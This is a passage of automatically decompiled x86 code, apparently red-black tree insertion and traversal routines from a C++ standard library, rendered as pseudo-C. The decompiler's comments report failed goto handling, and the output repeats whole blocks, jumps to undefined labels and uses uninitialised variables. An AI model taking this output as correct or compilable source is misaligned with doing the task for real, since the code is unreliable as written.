                    v50 = v6;
                    if (v50 != *(int32_t *)(v49 + 4)) {
                        // 0x408741
                        v1 = 0;
                        if (*(int32_t *)(v50 + 20) == 1) {
                            v26 = v50;
                            v52 = 1;
                            while (true) {
                                // 0x40874c
                                v51 = *(int32_t *)(v26 + 4);
                                v35 = *(int32_t *)v51;
                                v18 = v35;
                                if (v26 == v35) {
                                    goto lab_0x408755_9;
                                }
                                goto lab_0x4087c3_9;
                            }
                        }
                        // 0x40899a
                        // branch -> 0x40899a
                    }
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
                // Detected a possible infinite recursion (goto support failed); quitting...
            }
            // 0x4086f3
            v17 = (int32_t *)(*(int32_t *)(v39 + 4) + 8);
            v45 = *v17;
            if (v45 == v1) {
                // 0x4086fb
                v34 = g1178;
                if (*(int32_t *)v45 == v34) {
                    // 0x408707
                    v48 = *(int32_t *)(v45 + 4);
                    // branch -> 0x40871e
                } else {
                    // 0x40870c
                    v40 = v6;
                    v46 = *(int32_t *)(v40 + 8);
                    if (v46 != v34) {
                        v25 = v46;
                        v47 = *(int32_t *)(v25 + 8);
                        while (v47 != v34) {
                            // 0x408715
                            v25 = v47;
                            v47 = *(int32_t *)(v25 + 8);
                            // continue -> 0x408715
                        }
                        // 0x40871e
                        v48 = v25;
                        // branch -> 0x40871e
                    } else {
                        v48 = v40;
                    }
                }
                // 0x40871e
                *v17 = v48;
                // branch -> 0x408721
            }
            // 0x408721
            v9 = v2;
            v41 = g6;
            v20 = v37;
            // branch -> 0x408725
        } else {
            // 0x408631
            *(int32_t *)(*(int32_t *)v27 + 4) = v37;
            *(int32_t *)g6 = *(int32_t *)v1;
            v28 = *(int32_t *)v8;
            v21 = g6;
            if (v21 == v28) {
                // 0x408640
                *(int32_t *)(v6 + 4) = v28;
                // branch -> 0x40865a
            } else {
                // 0x408645
                *(int32_t *)(v6 + 4) = *(int32_t *)(v21 + 4);
                *(int32_t *)*(int32_t *)(g6 + 4) = v6;
                *(int32_t *)v9 = *(int32_t *)v8;
                *(int32_t *)(*(int32_t *)v8 + 4) = g6;
                // branch -> 0x40865a
            }
            // 0x40865a
            v42 = v2;
            v9 = v42;
            v11 = (int32_t *)(*(int32_t *)(v42 + 4) + 4);
            v53 = v1;
            if (*v11 == v53) {
                // 0x408666
                *v11 = g6;
                // branch -> 0x408679
            } else {
                // 0x40866b
                v43 = *(int32_t *)(v53 + 4);
                v12 = (int32_t *)v43;
                if (*v12 == v53) {
                    // 0x408672
                    *v12 = g6;
                    // branch -> 0x408679
                } else {
                    // 0x408676
                    *(int32_t *)(v43 + 8) = g6;
                    // branch -> 0x408679
                }
                // 0x408679
                v36 = v1;
                *(int32_t *)(g6 + 4) = *(int32_t *)(v36 + 4);
                v13 = (int32_t *)(g6 + 20);
                *v13 = *(int32_t *)(v1 + 20);
                *(int32_t *)(v1 + 20) = *v13;
                v22 = v1;
                g6 = v22;
                v20 = v36;
                // branch -> 0x408725
                // 0x408725
                v8 = 1;
                if (*(int32_t *)(v22 + 20) == 1) {
                    // 0x408735
                    v49 = *(int32_t *)(v9 + 4);
                    g6 = v49;
                    v50 = v6;
                    if (v50 != *(int32_t *)(v49 + 4)) {
                        // 0x408741
                        v1 = 0;
                        if (*(int32_t *)(v50 + 20) == 1) {
                            v26 = v50;
                            v52 = 1;
                            while (true) {
                                // 0x40874c
                                v51 = *(int32_t *)(v26 + 4);
                                v35 = *(int32_t *)v51;
                                v18 = v35;
                                if (v26 == v35) {
                                    goto lab_0x408755_9;
                                }
                                goto lab_0x4087c3_9;
                            }
                        }
                        // 0x40899a
                        // branch -> 0x40899a
                    }
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
                // Detected a possible infinite recursion (goto support failed); quitting...
            }
            // 0x408679
            v36 = v1;
            *(int32_t *)(g6 + 4) = *(int32_t *)(v36 + 4);
            v13 = (int32_t *)(g6 + 20);
            *v13 = *(int32_t *)(v1 + 20);
            *(int32_t *)(v1 + 20) = *v13;
            v22 = v1;
            g6 = v22;
            v41 = v22;
            v20 = v36;
            // branch -> 0x408725
        }
        // 0x408725
        v8 = 1;
        if (*(int32_t *)(v41 + 20) == 1) {
            // 0x408735
            v49 = *(int32_t *)(v9 + 4);
            g6 = v49;
            v50 = v6;
            if (v50 != *(int32_t *)(v49 + 4)) {
                // 0x408741
                v1 = 0;
                if (*(int32_t *)(v50 + 20) == 1) {
                    v26 = v50;
                    v52 = 1;
                    while (true) {
                        // 0x40874c
                        v51 = *(int32_t *)(v26 + 4);
                        v35 = *(int32_t *)v51;
                        v18 = v35;
                        if (v26 == v35) {
                            goto lab_0x408755_9;
                        }
                        goto lab_0x4087c3_9;
                    }
                }
                // 0x40899a
                // branch -> 0x40899a
            }
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // Detected a possible infinite recursion (goto support failed); quitting...
    }
    // 0x40861f
    _qm__qm_0_Lockit_std__QAE_XZ();
    g6 = v37;
    v27 = v1;
    if (v37 == v27) {
        // 0x408696
        v19 = v2;
        *(int32_t *)(v6 + 4) = *(int32_t *)(v37 + 4);
        v14 = (int32_t *)(*(int32_t *)(v19 + 4) + 4);
        v54 = v1;
        if (*v14 == v54) {
            // 0x4086a8
            *v14 = v6;
            // branch -> 0x4086bb
        } else {
            // 0x4086ad
            v44 = *(int32_t *)(v54 + 4);
            v15 = (int32_t *)v44;
            if (*v15 == v54) {
                // 0x4086b4
                *v15 = v6;
                // branch -> 0x4086bb
            } else {
                // 0x4086b8
                *(int32_t *)(v44 + 8) = v6;
                // branch -> 0x4086bb
            }
            // 0x4086bb
            v38 = v19;
            v16 = (int32_t *)*(int32_t *)(v38 + 4);
            v29 = *v16;
            v39 = v38;
            if (v29 == v1) {
                // 0x4086c6
                v30 = g1178;
                if (*(int32_t *)v8 == v30) {
                    // 0x4086d0
                    *v16 = *(int32_t *)(v29 + 4);
                    v39 = v19;
                    // branch -> 0x4086f3
                } else {
                    // 0x4086d7
                    v23 = v6;
                    v31 = *(int32_t *)v23;
                    v33 = v23;
                    if (v31 != v30) {
                        // 0x4086df
                        v24 = v31;
                        v32 = *(int32_t *)v24;
                        // branch -> 0x4086e1
                        while (v32 != v30) {
                            // 0x4086e1
                            v24 = v32;
                            v32 = *(int32_t *)v24;
                            // continue -> 0x4086e1
                        }
                        // 0x4086e9
                        v33 = v24;
                        // branch -> 0x4086ed
                    }
                    // 0x4086ed
                    *v16 = v33;
                    v39 = v2;
                    // branch -> 0x4086f3
                }
                // 0x4086f3
                v17 = (int32_t *)(*(int32_t *)(v39 + 4) + 8);
                v45 = *v17;
                if (v45 == v1) {
                    // 0x4086fb
                    v34 = g1178;
                    if (*(int32_t *)v45 == v34) {
                        // 0x408707
                        v48 = *(int32_t *)(v45 + 4);
                        // branch -> 0x40871e
                    } else {
                        // 0x40870c
                        v40 = v6;
                        v46 = *(int32_t *)(v40 + 8);
                        if (v46 != v34) {
                            v25 = v46;
                            v47 = *(int32_t *)(v25 + 8);
                            while (v47 != v34) {
                                // 0x408715
                                v25 = v47;
                                v47 = *(int32_t *)(v25 + 8);
                                // continue -> 0x408715
                            }
                            // 0x40871e
                            v48 = v25;
                            // branch -> 0x40871e
                        } else {
                            v48 = v40;
                        }
                    }
                    // 0x40871e
                    *v17 = v48;
                    // branch -> 0x408721
                }
                // 0x408721
                v9 = v2;
                v20 = v37;
                // branch -> 0x408725
                // 0x408725
                v8 = 1;
                if (*(int32_t *)(g6 + 20) == 1) {
                    // 0x408735
                    v49 = *(int32_t *)(v9 + 4);
                    g6 = v49;
                    v50 = v6;
                    if (v50 != *(int32_t *)(v49 + 4)) {
                        // 0x408741
                        v1 = 0;
                        if (*(int32_t *)(v50 + 20) == 1) {
                            v26 = v50;
                            v52 = 1;
                            while (true) {
                                // 0x40874c
                                v51 = *(int32_t *)(v26 + 4);
                                v35 = *(int32_t *)v51;
                                v18 = v35;
                                if (v26 == v35) {
                                    goto lab_0x408755_9;
                                }
                                goto lab_0x4087c3_9;
                            }
                        }
                        // 0x40899a
                        // branch -> 0x40899a
                    }
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
                // Detected a possible infinite recursion (goto support failed); quitting...
            }
            // 0x4086f3
            v17 = (int32_t *)(*(int32_t *)(v39 + 4) + 8);
            v45 = *v17;
            if (v45 == v1) {
                // 0x4086fb
                v34 = g1178;
                if (*(int32_t *)v45 == v34) {
                    // 0x408707
                    v48 = *(int32_t *)(v45 + 4);
                    // branch -> 0x40871e
                } else {
                    // 0x40870c
                    v40 = v6;
                    v46 = *(int32_t *)(v40 + 8);
                    if (v46 != v34) {
                        v25 = v46;
                        v47 = *(int32_t *)(v25 + 8);
                        while (v47 != v34) {
                            // 0x408715
                            v25 = v47;
                            v47 = *(int32_t *)(v25 + 8);
                            // continue -> 0x408715
                        }
                        // 0x40871e
                        v48 = v25;
                        // branch -> 0x40871e
                    } else {
                        v48 = v40;
                    }
                }
                // 0x40871e
                *v17 = v48;
                // branch -> 0x408721
            }
            // 0x408721
            v9 = v2;
            v20 = v37;
            // branch -> 0x408725
            // 0x408725
            v8 = 1;
            if (*(int32_t *)(g6 + 20) == 1) {
                // 0x408735
                v49 = *(int32_t *)(v9 + 4);
                g6 = v49;
                v50 = v6;
                if (v50 != *(int32_t *)(v49 + 4)) {
                    // 0x408741
                    v1 = 0;
                    if (*(int32_t *)(v50 + 20) == 1) {
                        v26 = v50;
                        v52 = 1;
                        while (true) {
                            // 0x40874c
                            v51 = *(int32_t *)(v26 + 4);
                            v35 = *(int32_t *)v51;
                            v18 = v35;
                            if (v26 == v35) {
                                goto lab_0x408755_9;
                            }
                            goto lab_0x4087c3_9;
                        }
                    }
                    // 0x40899a
                    // branch -> 0x40899a
                }
                // Detected a possible infinite recursion (goto support failed); quitting...
            }
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // 0x4086bb
        v38 = v19;
        v16 = (int32_t *)*(int32_t *)(v38 + 4);
        v29 = *v16;
        v39 = v38;
        if (v29 == v1) {
            // 0x4086c6
            v30 = g1178;
            if (*(int32_t *)v8 == v30) {
                // 0x4086d0
                *v16 = *(int32_t *)(v29 + 4);
                v39 = v19;
                // branch -> 0x4086f3
            } else {
                // 0x4086d7
                v23 = v6;
                v31 = *(int32_t *)v23;
                v33 = v23;
                if (v31 != v30) {
                    // 0x4086df
                    v24 = v31;
                    v32 = *(int32_t *)v24;
                    // branch -> 0x4086e1
                    while (v32 != v30) {
                        // 0x4086e1
                        v24 = v32;
                        v32 = *(int32_t *)v24;
                        // continue -> 0x4086e1
                    }
                    // 0x4086e9
                    v33 = v24;
                    // branch -> 0x4086ed
                }
                // 0x4086ed
                *v16 = v33;
                v39 = v2;
                // branch -> 0x4086f3
            }
            // 0x4086f3
            v17 = (int32_t *)(*(int32_t *)(v39 + 4) + 8);
            v45 = *v17;
            if (v45 == v1) {
                // 0x4086fb
                v34 = g1178;
                if (*(int32_t *)v45 == v34) {
                    // 0x408707
                    v48 = *(int32_t *)(v45 + 4);
                    // branch -> 0x40871e
                } else {
                    // 0x40870c
                    v40 = v6;
                    v46 = *(int32_t *)(v40 + 8);
                    if (v46 != v34) {
                        v25 = v46;
                        v47 = *(int32_t *)(v25 + 8);
                        while (v47 != v34) {
                            // 0x408715
                            v25 = v47;
                            v47 = *(int32_t *)(v25 + 8);
                            // continue -> 0x408715
                        }
                        // 0x40871e
                        v48 = v25;
                        // branch -> 0x40871e
                    } else {
                        v48 = v40;
                    }
                }
                // 0x40871e
                *v17 = v48;
                // branch -> 0x408721
            }
            // 0x408721
            v9 = v2;
            v20 = v37;
            // branch -> 0x408725
            // 0x408725
            v8 = 1;
            if (*(int32_t *)(g6 + 20) == 1) {
                // 0x408735
                v49 = *(int32_t *)(v9 + 4);
                g6 = v49;
                v50 = v6;
                if (v50 != *(int32_t *)(v49 + 4)) {
                    // 0x408741
                    v1 = 0;
                    if (*(int32_t *)(v50 + 20) == 1) {
                        v26 = v50;
                        v52 = 1;
                        while (true) {
                            // 0x40874c
                            v51 = *(int32_t *)(v26 + 4);
                            v35 = *(int32_t *)v51;
                            v18 = v35;
                            if (v26 == v35) {
                                goto lab_0x408755_9;
                            }
                            goto lab_0x4087c3_9;
                        }
                    }
                    // 0x40899a
                    // branch -> 0x40899a
                }
                // Detected a possible infinite recursion (goto support failed); quitting...
            }
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // 0x4086f3
        v17 = (int32_t *)(*(int32_t *)(v39 + 4) + 8);
        v45 = *v17;
        if (v45 == v1) {
            // 0x4086fb
            v34 = g1178;
            if (*(int32_t *)v45 == v34) {
                // 0x408707
                v48 = *(int32_t *)(v45 + 4);
                // branch -> 0x40871e
            } else {
                // 0x40870c
                v40 = v6;
                v46 = *(int32_t *)(v40 + 8);
                if (v46 != v34) {
                    v25 = v46;
                    v47 = *(int32_t *)(v25 + 8);
                    while (v47 != v34) {
                        // 0x408715
                        v25 = v47;
                        v47 = *(int32_t *)(v25 + 8);
                        // continue -> 0x408715
                    }
                    // 0x40871e
                    v48 = v25;
                    // branch -> 0x40871e
                } else {
                    v48 = v40;
                }
            }
            // 0x40871e
            *v17 = v48;
            // branch -> 0x408721
        }
        // 0x408721
        v9 = v2;
        v41 = g6;
        v20 = v37;
        // branch -> 0x408725
    } else {
        // 0x408631
        *(int32_t *)(*(int32_t *)v27 + 4) = v37;
        *(int32_t *)g6 = *(int32_t *)v1;
        v28 = *(int32_t *)v8;
        v21 = g6;
        if (v21 == v28) {
            // 0x408640
            *(int32_t *)(v6 + 4) = v28;
            // branch -> 0x40865a
        } else {
            // 0x408645
            *(int32_t *)(v6 + 4) = *(int32_t *)(v21 + 4);
            *(int32_t *)*(int32_t *)(g6 + 4) = v6;
            *(int32_t *)v9 = *(int32_t *)v8;
            *(int32_t *)(*(int32_t *)v8 + 4) = g6;
            // branch -> 0x40865a
        }
        // 0x40865a
        v42 = v2;
        v9 = v42;
        v11 = (int32_t *)(*(int32_t *)(v42 + 4) + 4);
        v53 = v1;
        if (*v11 == v53) {
            // 0x408666
            *v11 = g6;
            // branch -> 0x408679
        } else {
            // 0x40866b
            v43 = *(int32_t *)(v53 + 4);
            v12 = (int32_t *)v43;
            if (*v12 == v53) {
                // 0x408672
                *v12 = g6;
                // branch -> 0x408679
            } else {
                // 0x408676
                *(int32_t *)(v43 + 8) = g6;
                // branch -> 0x408679
            }
            // 0x408679
            v36 = v1;
            *(int32_t *)(g6 + 4) = *(int32_t *)(v36 + 4);
            v13 = (int32_t *)(g6 + 20);
            *v13 = *(int32_t *)(v1 + 20);
            *(int32_t *)(v1 + 20) = *v13;
            v22 = v1;
            g6 = v22;
            v20 = v36;
            // branch -> 0x408725
            // 0x408725
            v8 = 1;
            if (*(int32_t *)(v22 + 20) == 1) {
                // 0x408735
                v49 = *(int32_t *)(v9 + 4);
                g6 = v49;
                v50 = v6;
                if (v50 != *(int32_t *)(v49 + 4)) {
                    // 0x408741
                    v1 = 0;
                    if (*(int32_t *)(v50 + 20) == 1) {
                        v26 = v50;
                        v52 = 1;
                        while (true) {
                            // 0x40874c
                            v51 = *(int32_t *)(v26 + 4);
                            v35 = *(int32_t *)v51;
                            v18 = v35;
                            if (v26 == v35) {
                                goto lab_0x408755_9;
                            }
                            goto lab_0x4087c3_9;
                        }
                    }
                    // 0x40899a
                    // branch -> 0x40899a
                }
                // Detected a possible infinite recursion (goto support failed); quitting...
            }
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // 0x408679
        v36 = v1;
        *(int32_t *)(g6 + 4) = *(int32_t *)(v36 + 4);
        v13 = (int32_t *)(g6 + 20);
        *v13 = *(int32_t *)(v1 + 20);
        *(int32_t *)(v1 + 20) = *v13;
        v22 = v1;
        g6 = v22;
        v41 = v22;
        v20 = v36;
        // branch -> 0x408725
    }
    // 0x408725
    v8 = 1;
    if (*(int32_t *)(v41 + 20) == 1) {
        // 0x408735
        v49 = *(int32_t *)(v9 + 4);
        g6 = v49;
        v50 = v6;
        if (v50 != *(int32_t *)(v49 + 4)) {
            // 0x408741
            v1 = 0;
            if (*(int32_t *)(v50 + 20) == 1) {
                v26 = v50;
                v52 = 1;
                while (true) {
                    // 0x40874c
                    v51 = *(int32_t *)(v26 + 4);
                    v35 = *(int32_t *)v51;
                    v18 = v35;
                    if (v26 == v35) {
                        goto lab_0x408755_9;
                    }
                    goto lab_0x4087c3_9;
                }
            }
            // 0x40899a
            // branch -> 0x40899a
        }
        // Detected a possible infinite recursion (goto support failed); quitting...
    }
    // Detected a possible infinite recursion (goto support failed); quitting...
}

// Address range: 0x4089d0 - 0x408a0f
int32_t function_4089d0(int32_t * a1, int32_t a2) {
    int32_t result = (int32_t)a1;
    int32_t v1 = g3; // 0x4089d5
    int32_t v2 = g7; // 0x4089d6
    int32_t v3 = g5; // 0x4089d7
    int32_t v4 = v3; // bp-12
    g5 = result;
    int32_t v5 = g4; // 0x4089dc
    g3 = v5;
    g7 = result;
    if (result == g1178) {
        // 0x408a05
        g5 = v3;
        g7 = v2;
        g3 = v1;
        return result;
    }
    // branch -> 0x4089e4
    while (true) {
        // 0x4089e4
        g4 = v5;
        g1 = function_4089d0((int32_t *)*(int32_t *)(result + 8), v3);
        g7 = *(int32_t *)g7;
        function_4097fe((char *)g5);
        int32_t v6 = g7; // 0x4089ff
        g5 = v6;
        if (v6 == g1178) {
            // 0x408a05
            // branch -> 0x408a05
            // 0x408a05
            g5 = v4;
            g7 = v2;
            g3 = v1;
            return g1178;
        }
        // 0x4089e4
        v3 = v4;
        v5 = g3;
        result = v6;
        // branch -> 0x4089e4
    }
}

// Address range: 0x408a10 - 0x408a5f
int32_t function_408a10(int32_t a1) {
    int32_t * v1 = (int32_t *)g4; // 0x408a10_0
    int32_t v2 = *v1; // 0x408a10
    int32_t v3 = g7; // bp-4
    int32_t v4 = *(int32_t *)(v2 + 8); // 0x408a19
    if (v4 != g1178) {
        int32_t v5 = *(int32_t *)v4; // 0x408a20
        g1 = v5;
        if (v5 == g1178) {
            // 0x408a2e
            *v1 = v4;
            g7 = v3;
            return g1;
        }
        int32_t v6 = *(int32_t *)v5; // 0x408a28
        g1 = v6;
        while (v6 != g1178) {
            // 0x408a26
            v5 = v6;
            v6 = *(int32_t *)v5;
            g1 = v6;
            // continue -> 0x408a26
        }
        // 0x408a2e
        // branch -> 0x408a2e
        // 0x408a2e
        *v1 = v5;
        g7 = v3;
        return g1;
    }
    int32_t v7 = *(int32_t *)(v2 + 4); // 0x408a32
    g1 = v7;
    int32_t v8 = v7; // 0x408a4f
    if (*v1 == *(int32_t *)(v7 + 8)) {
        *(int32_t *)g4 = v7;
        int32_t v9 = *(int32_t *)(g1 + 4); // 0x408a3e
        g1 = v9;
        while (*(int32_t *)g4 == *(int32_t *)(v9 + 8)) {
            // 0x408a3c
            *(int32_t *)g4 = v9;
            v9 = *(int32_t *)(g1 + 4);
            g1 = v9;
            // continue -> 0x408a3c
        }
        // 0x408a48
        v8 = v9;
        // branch -> 0x408a48
    }
    int32_t * v10 = (int32_t *)g4; // 0x408a48_0
    int32_t result; // 0x408a52_2
    if (*(int32_t *)(*v10 + 8) != v8) {
        // 0x408a4f
        *v10 = v8;
        result = g1;
        // branch -> 0x408a51
    } else {
        result = v8;
    }
    // 0x408a51
    g7 = v3;
    return result;
}

// Address range: 0x408a60 - 0x408ccf
int32_t function_408a60(int32_t * a1, int32_t a2, int32_t * a3, int32_t * a4, int32_t a5, int32_t a6) {
    int32_t result = (int32_t)a1;
    int32_t v1 = (int32_t)a3;
    int32_t v2 = g4; // ebx
    _qm__qm_2_YAPAXI_Z(24);
    int32_t v3 = v1; // esi
    *(int32_t *)(g1 + 4) = v1;
    *(int32_t *)(g1 + 20) = 0;
    *(int32_t *)g1 = g1178;
    *(int32_t *)(g1 + 8) = g1178;
    function_408e30((int32_t *)(g1 + 12), a4);
    int32_t * v4 = (int32_t *)(v2 + 12); // 0x408a9c_0
    *v4 = *v4 + 1;
    int32_t * v5; // 0x408ae8_0
    int32_t * v6; // 0x408b01_0
    int32_t v7; // eax
    int32_t v8; // edi
    int32_t v9; // 0x408ad9
    int32_t v10; // 0x408af1
    int32_t v11; // 0x408aee
    int32_t v12; // 0x408ad6
    int32_t v13; // 0x408afc
    int32_t v14; // 0x408b3e
    if (v3 != *(int32_t *)(v2 + 4)) {
        // 0x408aad
        if (g1178 == a2) {
            // 0x408abb
            if (*(int32_t *)(int32_t)a4 >= *(int32_t *)(v3 + 12)) {
                // 0x408ac4
                *(int32_t *)(v3 + 8) = g1;
                int32_t * v15 = (int32_t *)(*(int32_t *)(v2 + 4) + 8); // 0x408aca_0
                if (v3 == *v15) {
                    // 0x408acf
                    *v15 = g1;
                    // branch -> 0x408aee
                }
                // 0x408aee
                v11 = v2;
                v10 = g1;
                v7 = v10;
                if (v10 == *(int32_t *)(*(int32_t *)(v11 + 4) + 4)) {
                    // 0x408cab
                    *(int32_t *)(*(int32_t *)(*(int32_t *)(v11 + 4) + 4) + 20) = 1;
                    *a1 = g1;
                    return result;
                }
                int32_t v16 = v11; // 0x408cab41
                v14 = v10;
                int32_t v17; // 0x408c9f
                while (true) {
                    // 0x408afc
                    v13 = *(int32_t *)(v14 + 4);
                    v8 = 0;
                    v6 = (int32_t *)(v13 + 20);
                    int32_t v18 = v16; // 0x408cab40
                    if (*v6 == 0) {
                      lab_0x408b0a_2:;
                        int32_t v19 = *(int32_t *)(v13 + 4); // 0x408b0a
                        int32_t v20 = *(int32_t *)v19; // 0x408b0d
                        int32_t v21 = v20; // edx
                        int32_t v22; // ecx
                        int32_t v23; // 0x408b36
                        int32_t v24; // 0x408c9f
                        int32_t v25; // 0x408ca2
                        if (v13 == v20) {
                            int32_t v26 = *(int32_t *)(v19 + 8); // 0x408b17
                            v21 = v26;
                            if (*(int32_t *)(v26 + 20) == 0) {
                                // 0x408b1f
                                *v6 = 1;
                                *(int32_t *)(v21 + 20) = 1;
                                int32_t v27 = *(int32_t *)(v7 + 4); // 0x408b2a
                                *(int32_t *)(*(int32_t *)(v27 + 4) + 20) = v8;
                                v23 = *(int32_t *)(*(int32_t *)(v7 + 4) + 4);
                                v7 = v23;
                                // branch -> 0x408c9f
                            } else {
                                int32_t * v28 = (int32_t *)(v13 + 8); // 0x408b3e_0
                                int32_t v29 = v14; // 0x408b80
                                int32_t * v30; // 0x408b99_0
                                int32_t v31; // 0x408b99
                                int32_t v32; // 0x408ba0
                                int32_t v33; // 0x408bb1
                                int32_t v34; // 0x408b8a
                                int32_t v35; // 0x408b96
                                int32_t v36; // 0x408ba0
                                if (v14 == *v28) {
                                    // 0x408b43
                                    v7 = v13;
                                    int32_t v37 = *v28; // 0x408b45
                                    v22 = v37;
                                    *v28 = *(int32_t *)v37;
                                    int32_t v38 = *(int32_t *)v22; // 0x408b4d
                                    if (v38 != g1178) {
                                        // 0x408b57
                                        *(int32_t *)(v38 + 4) = v7;
                                        // branch -> 0x408b5a
                                    }
                                    // 0x408b5a
                                    *(int32_t *)(v22 + 4) = *(int32_t *)(v7 + 4);
                                    int32_t v39 = v7; // 0x408b63
                                    int32_t * v40 = (int32_t *)(*(int32_t *)(v2 + 4) + 4); // 0x408b63_0
                                    int32_t v41;
                                    if (v39 == *v40) {
                                        // 0x408b68
                                        *v40 = v22;
                                        // branch -> 0x408b7b
                                    } else {
                                        int32_t v42 = *(int32_t *)(v39 + 4); // 0x408b6d
                                        int32_t * v43 = (int32_t *)v42; // 0x408b70_0
                                        if (v39 == *v43) {
                                            // 0x408b74
                                            *v43 = v22;
                                            // branch -> 0x408b7b
                                        } else {
                                            // 0x408b78
                                            *(int32_t *)(v42 + 8) = v22;
                                            // branch -> 0x408b7b
                                        }
                                        // 0x408b7b
                                        *(int32_t *)v22 = v7;
                                        *(int32_t *)(v7 + 4) = v22;
                                        // branch -> 0x408b80
                                      lab_0x408b80:
                                        // 0x408b80
                                        *(int32_t *)(*(int32_t *)(v41 + 4) + 20) = 1;
                                        v34 = *(int32_t *)(v7 + 4);
                                        *(int32_t *)(*(int32_t *)(v34 + 4) + 20) = v8;
                                        v35 = *(int32_t *)(*(int32_t *)(v7 + 4) + 4);
                                        v22 = v35;
                                        v30 = (int32_t *)v35;
                                        v31 = *v30;
                                        v21 = v31;
                                        *v30 = *(int32_t *)(v31 + 8);
                                        v32 = v21;
                                        v36 = *(int32_t *)(v32 + 8);
                                        v33 = v32;
                                        if (v36 != g1178) {
                                          lab_0x408bab:
                                            // 0x408bab
                                            *(int32_t *)(v36 + 4) = v22;
                                            v33 = v21;
                                            // branch -> 0x408bae
                                        }
                                      lab_0x408bae:
                                        // 0x408bae
                                        *(int32_t *)(v33 + 4) = *(int32_t *)(v22 + 4);
                                        int32_t v44 = v22; // 0x408bb7
                                        int32_t * v45 = (int32_t *)(*(int32_t *)(v2 + 4) + 4); // 0x408bb7_0
                                        if (v44 == *v45) {
                                            // 0x408bbc
                                            *v45 = v21;
                                            *(int32_t *)(v21 + 8) = v22;
                                            // branch -> 0x408c9c
                                        } else {
                                            int32_t v46 = *(int32_t *)(v44 + 4); // 0x408bc7
                                            int32_t * v47 = (int32_t *)(v46 + 8); // 0x408bca_0
                                            int32_t v48 = v21; // 0x408bcf
                                            if (v44 == *v47) {
                                                // 0x408bcf
                                                *v47 = v48;
                                                *(int32_t *)(v21 + 8) = v22;
                                                // branch -> 0x408c9c
                                            } else {
                                                // 0x408bda
                                                *(int32_t *)v46 = v48;
                                                *(int32_t *)(v21 + 8) = v22;
                                                // branch -> 0x408c9c
                                            }
                                            // 0x408c9c
                                            *(int32_t *)(v22 + 4) = v21;
                                            v23 = v7;
                                            // branch -> 0x408c9f
                                          lab_0x408c9f:
                                            // 0x408c9f
                                            v17 = v2;
                                            if (v23 == *(int32_t *)(*(int32_t *)(v17 + 4) + 4)) {
                                                // break -> 0x408cab
                                                break;
                                            }
                                            v16 = v17;
                                            v14 = v23;
                                            // continue -> 0x408afc
                                            continue;
                                        }
                                      lab_0x408c9c_2:
                                        // 0x408c9c
                                        *(int32_t *)(v22 + 4) = v21;
                                        v23 = v7;
                                        // branch -> 0x408c9f
                                        goto lab_0x408c9f;
                                    }
                                    // 0x408b7b
                                    *(int32_t *)v22 = v7;
                                    *(int32_t *)(v7 + 4) = v22;
                                    v41 = v7;
                                    // branch -> 0x408b80
                                    goto lab_0x408b80;
                                }
                                // 0x408b80
                                *(int32_t *)(*(int32_t *)(v29 + 4) + 20) = 1;
                                v34 = *(int32_t *)(v7 + 4);
                                *(int32_t *)(*(int32_t *)(v34 + 4) + 20) = v8;
                                v35 = *(int32_t *)(*(int32_t *)(v7 + 4) + 4);
                                v22 = v35;
                                v30 = (int32_t *)v35;
                                v31 = *v30;
                                v21 = v31;
                                *v30 = *(int32_t *)(v31 + 8);
                                v32 = v21;
                                v36 = *(int32_t *)(v32 + 8);
                                if (v36 == g1178) {
                                    v33 = v32;
                                    goto lab_0x408bae;
                                }
                                goto lab_0x408bab;
                            }
                          lab_0x408c9f_2:
                            // 0x408c9f
                            v17 = v2;
                            if (v23 == *(int32_t *)(*(int32_t *)(v17 + 4) + 4)) {
                                // break -> 0x408cab
                                break;
                            }
                            v16 = v17;
                            v14 = v23;
                            // continue -> 0x408afc
                            continue;
                        } else {
                            // 0x408be4
                            if (*(int32_t *)(v20 + 20) == 0) {
                                // 0x408be9
                                *v6 = 1;
                                *(int32_t *)(v21 + 20) = 1;
                                int32_t v49 = *(int32_t *)(v7 + 4); // 0x408bf4
                                *(int32_t *)(*(int32_t *)(v49 + 4) + 20) = v8;
                                int32_t v50 = *(int32_t *)(*(int32_t *)(v7 + 4) + 4); // 0x408c00
                                v7 = v50;
                                v23 = v50;
                                // branch -> 0x408c9f
                                goto lab_0x408c9f_2;
                            } else {
                                int32_t * v51 = (int32_t *)v13; // 0x408c08_0
                                int32_t v52 = v14; // 0x408c4b
                                int32_t * v53; // 0x408c64_0
                                int32_t v54; // 0x408c6c
                                int32_t v55; // 0x408c6c
                                int32_t v56; // 0x408c7c
                                int32_t v57; // 0x408c55
                                int32_t v58; // 0x408c61
                                int32_t v59; // 0x408c64
                                if (v14 == *v51) {
                                    // 0x408c0c
                                    v7 = v13;
                                    int32_t v60 = *v51; // 0x408c0e
                                    v22 = v60;
                                    *v51 = *(int32_t *)(v60 + 8);
                                    int32_t v61 = *(int32_t *)(v22 + 8); // 0x408c15
                                    if (v61 != g1178) {
                                        // 0x408c20
                                        *(int32_t *)(v61 + 4) = v7;
                                        // branch -> 0x408c23
                                    }
                                    // 0x408c23
                                    *(int32_t *)(v22 + 4) = *(int32_t *)(v7 + 4);
                                    int32_t v62 = v7; // 0x408c2c
                                    int32_t * v63 = (int32_t *)(*(int32_t *)(v2 + 4) + 4); // 0x408c2c_0
                                    int32_t v64;
                                    if (v62 == *v63) {
                                        // 0x408c31
                                        *v63 = v22;
                                        // branch -> 0x408c45
                                    } else {
                                        int32_t v65 = *(int32_t *)(v62 + 4); // 0x408c36
                                        int32_t * v66 = (int32_t *)(v65 + 8); // 0x408c39_0
                                        int32_t v67 = v22; // 0x408c3e
                                        if (v62 == *v66) {
                                            // 0x408c3e
                                            *v66 = v67;
                                            // branch -> 0x408c45
                                        } else {
                                            // 0x408c43
                                            *(int32_t *)v65 = v67;
                                            // branch -> 0x408c45
                                        }
                                        // 0x408c45
                                        *(int32_t *)(v22 + 8) = v7;
                                        *(int32_t *)(v7 + 4) = v22;
                                        // branch -> 0x408c4b
                                      lab_0x408c4b:
                                        // 0x408c4b
                                        *(int32_t *)(*(int32_t *)(v64 + 4) + 20) = 1;
                                        v57 = *(int32_t *)(v7 + 4);
                                        *(int32_t *)(*(int32_t *)(v57 + 4) + 20) = v8;
